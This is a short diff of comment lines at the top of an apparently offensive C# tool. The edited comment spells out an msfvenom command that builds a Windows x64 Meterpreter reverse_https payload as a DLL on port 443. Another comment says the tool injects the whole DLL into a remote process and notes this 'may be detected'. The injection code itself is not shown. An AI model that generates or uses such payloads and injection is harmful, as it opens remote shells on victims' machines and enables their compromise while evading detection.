@@ -1,4 +1,4 @@
-//msfvenom -p windows/x64/meterpreter/reverse_https -f dll 
+//generate DLL w/ msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT=443 -f dll -o met.dll
 //inject entire DLL into remote process (may be detected) 
 
 using System;
